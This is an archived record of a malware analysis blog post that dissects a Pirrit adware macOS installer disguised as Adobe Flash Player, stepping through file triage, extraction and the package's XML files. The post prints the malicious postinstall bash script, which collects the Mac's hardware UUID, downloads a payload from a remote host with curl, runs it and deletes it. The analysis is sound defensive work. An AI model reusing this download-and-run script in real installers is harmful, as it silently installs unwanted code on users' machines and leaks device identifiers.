{
    "id": "7aa1f2f9-4b52-4f14-9831-6a9d33ab1d29",
    "created_at": "2023-01-12T14:59:28.935827Z",
    "updated_at": "2025-03-27T02:06:08.339425Z",
    "deleted_at": null,
    "sha1_hash": "14c7d560b12354fc3a0dc19ddcfe5d82944a2d72",
    "title": "2022-05-13 - Analyzing a Pirrit adware installer",
    "authors": "",
    "file_creation_date": "2022-07-18T18:22:59Z",
    "file_modification_date": "2022-07-18T18:22:59Z",
    "file_size": 399427,
    "plain_text": "# Analyzing a Pirrit adware installer\n\n**forensicitguy.github.io/analyzing-pirrit-adware-installer/**\n\nBy _[Tony Lambert](https://twitter.com/ForensicITGuy)_\nPosted 2022-05-13 9 min read\n\n\nMay 13, 2022\n\n\nWhile Windows holds the largest market share on malware, macOS has its fair share of\nthreats that mostly exist in an adware/grayware area. In this post I want to walk through\nhow a Pirrit PKG file installer works. There are lots of more complex threats, but this is a\ngood place to start if you’re just jumping into analysis. If you want to follow along at home,\nI’m working with this file in MalwareBazaar:\nhttps://bazaar.abuse.ch/sample/d39426dbceb54bba51587242f8101184df43cc23af7dc7b36\n4ca2327e28e7825/.\n\n## Triaging the installer\n\nFirst, we need to verify we’re looking at a macOS installer file. To do this, we can use\n```\n file and diec .\n  remnux@remnux:~/cases/pirrit$ file FlashPlayer_01.0.pkg\n\n  FlashPlayer_01.0.pkg: xar archive compressed TOC: 4540, SHA-1\n  checksum\n\n  remnux@remnux:~/cases/pirrit$ diec FlashPlayer_01.0.pkg\n\n  Binary\n\n    Archive: XAR\n\n\n```\n[The macOS pkg installer file format is a XAR archive, so the output from both utilities jives](https://en.wikipedia.org/wiki/.pkg)\nwith what I would expect. From here we have to extract the installer material.\n\n## Extracting the package contents\n\nTo extract the package contents we can use `bsdtar from the` `libarchive-tools`\nUbuntu Linux package. The usual `tar utility doesn’t work for me, but the FreeBSD`\nimplementation in the package works\n\n\n-----\n\n```\n  remnux@remnux:~/cases/pirrit$ mkdir extracted\n\n  remnux@remnux:~/cases/pirrit$ bsdtar xvf FlashPlayer_01.0.pkg -C\n  extracted/\n\n  x Distribution\n\n  x Resources\n\n  x Resources/adobe_backgrounda.png\n\n  x Resources/en.lproj\n\n  x Resources/en.lproj/iem.html\n\n  x Resources/adobe_background.png\n\n  x base.pkg\n\n  x base.pkg/Payload\n\n  x base.pkg/Bom\n\n  x base.pkg/Scripts\n\n  x base.pkg/PackageInfo\n\n```\nAfter successfully extracting the files to the “extracted” folder, we can browse around the\ninstaller file’s contents. The first step will be inspecting the extracted `Distribution file.`\n\n## Inspecting Distribution\n\nThe `Distribution file contains details to help define and control the installation`\nexperience, which may include multiple packages within a single PKG file. In most case, the\nfile is easily viewed in a text editor.\n```\n  <?xml version=\"1.0\" encoding=\"utf-8\"?>\n\n  <installer-script minSpecVersion=\"1.000000\"\n  authoringTool=\"com.apple.PackageMaker\" authoringToolVersion=\"3.0.3\"\n  authoringToolBuild=\"174\">\n\n    <title>Install Wizz</title>\n\n```\n\n-----\n\n```\n  options customize never allow external scripts no /\n\n  <domains enable_anywhere=\"true\"/>\n\n  <installation-check script=\"pm_install_check();\"/>\n\n  <script>function pm_install_check() {\n\n if(!(system.compareVersions(system.version.ProductVersion,'10.5') >= 0)) {\n\n  my.result.title = 'Failure';\n\n  my.result.message = 'You need at least Mac OS X 10.5 to install Install Wizz\nproducts.';\n\n  my.result.type = 'Fatal';\n\n  return false;\n\n }\n\n return true;\n\n}\n\n</script>\n\n  <background file=\"adobe_backgrounda.png\" alignment=\"left\" scaling=\"none\"/>\n\n  <welcome file=\"iem.html\"/>\n\n  <choices-outline>\n\n    <line choice=\"choice1\"/>\n\n  </choices-outline>\n\n  <choice id=\"choice1\" title=\"base\">\n\n    <pkg-ref id=\"com.InstallWizz.base.pkg\"/>\n\n  </choice>\n\n  <pkg-ref id=\"com.InstallWizz.base.pkg\" installKBytes=\"200\" version=\"2.2.5\"\nauth=\"\">#base.pkg</pkg-ref>\n\n</installer-script>\n\n```\n\n-----\n\nThe `installer-script tag gives some metadata regarding what tools created the`\n[installer file. In this case it looks like the authors possibly used PackageMaker 3.0.3. This](http://s.sudre.free.fr/Stuff/PackageMaker_Howto.html)\nmetadata is possibly arbitrary because I’ve encountered `Distribution files that don’t`\nhave it inside. The next interesting thing is the chunk of JavaScript code contained within\nthe `script tag and called by the` `installation-check tag. In this code, the developer`\ndefined a `pm_install_check() which determines the current system’s macOS version`\nusing `system.version.ProductVersion. The version number is compared to 10.5 and the`\ninstallation will only proceed if the version is later than that version. If the macOS version is\nolder than Snow Leopard, the installation fails.\n\nFinally, the `Distribution file references a` `base.pkg package that will be applied to the`\nsystem during installation. We saw some references to `base.pkg during extraction, so`\nlet’s go check that out.\n\n## Examining base.pkg\n\nGetting a directory listing for `base.pkg, we can see a few files.`\n```\n  remnux@remnux:~/cases/pirrit/extracted/base.pkg$ ll\n\n  total 24\n\n  drwxr-xr-x 2 remnux remnux 4096 Apr 29 2017 ./\n\n  drwxrwxr-x 4 remnux remnux 4096 May 13 20:30 ../\n\n  -rw-r--r-- 1 remnux remnux 1022 Apr 29 2017 Bom\n\n  -rw-r--r-- 1 remnux remnux 394 Apr 29 2017\n  PackageInfo\n\n  -rw-r--r-- 1 remnux remnux 114 Apr 29 2017\n  Payload\n\n  -rw-r--r-- 1 remnux remnux 697 Apr 29 2017\n  Scripts\n\n\n```\nThere are a few files here. First, `Bom is a “bill of materials” file. This file is supposed to`\ncontain a list of files and things to touch during the installation and it doesn’t typically\ncontain malicious code. One of the things on my “to-do” list is to write a tool I like to parse\n\n\n-----\n\n```\nBom files. The next interesting file is PackageInfo . This is a XML file that describes the\n\n```\ncontents of `base.pkg .`\n```\n  <pkg-info format-version=\"2\" identifier=\"com.DataTech.base.pkg\" version=\"1.3.0\"\n  install-location=\"/\" auth=\"\">\n\n   <payload installKBytes=\"200\" numberOfFiles=\"2\"/>\n\n   <scripts>\n\n    <postinstall file=\"./postinstall\"/>\n\n   </scripts>\n\n  <bundle-version>\n\n    <bundle id=\"com.DataTech\" CFBundleIdentifier=\"com.DataTech\"\n  path=\"./Applications/DataTech.app\" CFBundleVersion=\"1\"/>\n\n  </bundle-version>\n\n  </pkg-info>\n\n\n```\nThe `payload tag has some metadata to show that the installed components are supposed`\nto be 2 files totaling 200 KB in size. A payload size this small typically indicates that there\nisn’t much of any payload in the package at all, I’d expect there to be script content here\nrather than Mach-O binaries. The `scripts tag specifies that we can expect a`\n```\npostinstall script to be present and execute during installation. In many cases you’ll\n\n```\nalso see a `preinstall script. In legitimate installers these scripts are intended to prepare`\na system for installation and then clean up components afterward. In malicious installers,\nthe scripts are usually used to establish persistence or download additional content.\n\nLet’s jump over to inspect the package payload.\n\n## Extracting and analyzing any payloads\n\nIn macOS PKG files, the “payload” and “script” contents are stored within archives that are\ncompressed using cpio and gzip. We can extract any contents pretty easily on the Linux\ncommand line.\n\n\n-----\n\n```\n  remnux@remnux:~/cases/pirrit/extracted/base.pkg$ file Payload\n\n  Payload: gzip compressed data, last modified: Sat Apr 29 21:30:57 2017, from\n  Unix, original size modulo 2^32 512\n\n  remnux@remnux:~/cases/pirrit/extracted/base.pkg$ cat Payload | gunzip | cpio -i\n\n  1 block\n\n  remnux@remnux:~/cases/pirrit/extracted/base.pkg$ ll\n\n  total 28\n\n  drwxr-xr-x 3 remnux remnux 4096 May 13 21:18 ./\n\n  drwxrwxr-x 4 remnux remnux 4096 May 13 20:30 ../\n\n  drwxr-xr-x 2 remnux remnux 4096 May 13 21:17 Applications/\n\n  -rw-r--r-- 1 remnux remnux 1022 Apr 29 2017 Bom\n\n  -rw-r--r-- 1 remnux remnux 394 Apr 29 2017 PackageInfo\n\n  -rw-r--r-- 1 remnux remnux 114 Apr 29 2017 Payload\n\n  -rw-r--r-- 1 remnux remnux 697 Apr 29 2017 Scripts\n\n  remnux@remnux:~/cases/pirrit/extracted/base.pkg$ tree -a Applications/\n\n  Applications/\n\n  0 directories, 0 files\n\n```\nThe only thing within the package’s Payloads archive was an `Applications folder, and it`\ndidn’t contain anything else. We can do something similar for the Scripts archive.\n\n## Extracting and analyzing any scripts\n\n\n-----\n\nJust like with Payloads, we can extract the contents of Scripts.\n```\n  remnux@remnux:~/cases/pirrit/extracted/base.pkg$ cat Scripts | gunzip | cpio\n  -i\n  4 blocks\n\n  remnux@remnux:~/cases/pirrit/extracted/base.pkg$ ll\n\n  total 56\n\n  drwxr-xr-x 3 remnux remnux 4096 May 13 21:21 ./\n\n  drwxrwxr-x 4 remnux remnux 4096 May 13 20:30 ../\n\n  -rw-r--r-- 1 remnux remnux  36 May 13 21:21 66c1ffac-c020-4385-b6c8  a23192676f00\n\n  -rw-r--r-- 1 remnux remnux  36 May 13 21:21 7d13cfd4-0ea8-423c-aaca  d9724d1ae3f4\n\n  -rw-r--r-- 1 remnux remnux  36 May 13 21:21 8b84eaf8-a670-4cd9-b519  46725438c885\n\n  -rw-r--r-- 1 remnux remnux  36 May 13 21:21 8d6b1599-5bd7-4043-918c  b67863e24970\n\n  -rw-r--r-- 1 remnux remnux  36 May 13 21:21 a62f3b05-8125-4b5e-b035  e49985109b9a\n\n  drwxr-xr-x 2 remnux remnux 4096 May 13 21:17 Applications/\n\n  -rw-r--r-- 1 remnux remnux 1022 Apr 29 2017 Bom\n\n  -rw-r--r-- 1 remnux remnux  36 May 13 21:21 c45eb9d2-0c19-44b3-bdc1  7f936567f746\n\n  -rw-r--r-- 1 remnux remnux 394 Apr 29 2017 PackageInfo\n\n  -rw-r--r-- 1 remnux remnux 114 Apr 29 2017 Payload\n\n  -rwxr-xr-x 1 remnux remnux 756 May 13 21:21 postinstall*\n\n  -rw-r--r-- 1 remnux remnux 697 Apr 29 2017 Scripts\n\n```\n\n-----\n\nThe Scripts archive contained multiple files that are named with GUIDs. Inside those files\nare GUID values that match the name of the file. They don’t seem to add anything to the\nexperience here, so we can focus on the `postinstall script itself.`\n```\n  #!/bin/bash\n\n  func_act(){\n\n    OS_Version=$(sw_vers -productVersion)\n\n    mid=$(ioreg -rd1 -c IOPlatformExpertDevice | awk '/IOPlatformUUID/ {\n  split($0, line, \"\\\"\"); printf(\"%s\\n\", line[4]); }')\n\n    if [[ ${OS_Version} == *\"10.12\"* ]]; then\n\n     /usr/bin/curl -s -L -o /var/tmp/act.tgz\n  \"hxxp://c.firstinstallmac[.]club/is/cact?i=\"413cc336-95fb-4d47-aa10  d4f06f790e1c\"&ve=10.12&id=$mid\"\n\n    else\n\n     /usr/bin/curl -s -L -o /var/tmp/act.tgz\n  \"hxxp://c.firstinstallmac[.]club/is/cact?i=\"413cc336-95fb-4d47-aa10  d4f06f790e1c\"&id=$mid\"\n\n    fi\n\n    tar -xzf /var/tmp/act.tgz -C /var/tmp\n\n    /var/tmp/act/act \"2712c147-7e15-4366-80e0-4c7b98d780f0\" \"413cc336-95fb-4d47  aa10-d4f06f790e1c\"\n\n    sleep 120\n\n    rm -rf /var/tmp/act/act\n\n    rm -rf /var/tmp/act.tgz\n\n  }\n\n  func_act &\n\n\n```\nThe script defines a function `func_act() which downloads and executes arbitrary content`\nfrom a remote URL. The first few lines grab the macOS version using `sw_vers and the`\naffected system’s UUID using `ioreg . If macOS version on the affected system is running`\n10.12 (Sierra) a specific parameter is added to the URL called by `curl . No matter the`\n\n\n-----\n\nversion, however, the script downloads an `act.tgz file from`\n```\nc.firstinstallmac[.]club and writes it to disk. The script then unpacks it to\n/var/tmp/act . Finally, the script executes the process /var/tmp/act/act, feeding\n\n```\nsome UID values to it as arguments before sleeping and then removing all the contents\ndownloaded.\n\nAfter executing, the contents from `postinstall should not exist on the affected system`\nanymore.\n\n## Script-only packages\n\nThis installer package is an example of something I’ve seen across Pirrit and WizardUpdate\nadware families: script-only packages. In these cases, no actual binary content exists in the\ninstaller files, and all the executable content is downloaded via a script. I’m not really sure\nwhy developers do this, but I suspect it’s related to evading static signatures or allowing the\nadversary to distribute one single installer while the actual adware/malware downloaded\ncan change out on demand.\n\n## Masquerading as Adobe\n\nBefore stopping for the night, I want to cover something that is potentially concerning for\nvictims and for legitimate software developers. In this instance of malware and many others,\nthe developer masquerades the installer to pose as an Adobe product. This is seen in an\nHTML file displayed during the installation that claims to be associated with “Flash Player”\nand a background image using an Adobe logo.\n\n\n-----\n\nThis is even potentially an avenue that developers can use to fight adware, because this\nstuff definitely isn’t associated with Adobe in any way. Thank you for reading!\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-05-13 - Analyzing a Pirrit adware installer.pdf"
    ],
    "report_names": [
        "2022-05-13 - Analyzing a Pirrit adware installer.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535568,
    "ts_updated_at": 1743041168,
    "ts_creation_date": 1658168579,
    "ts_modification_date": 1658168579,
    "files": {
        "pdf": "https://archive.orkl.eu/14c7d560b12354fc3a0dc19ddcfe5d82944a2d72.pdf",
        "text": "https://archive.orkl.eu/14c7d560b12354fc3a0dc19ddcfe5d82944a2d72.txt",
        "img": "https://archive.orkl.eu/14c7d560b12354fc3a0dc19ddcfe5d82944a2d72.jpg"
    }
}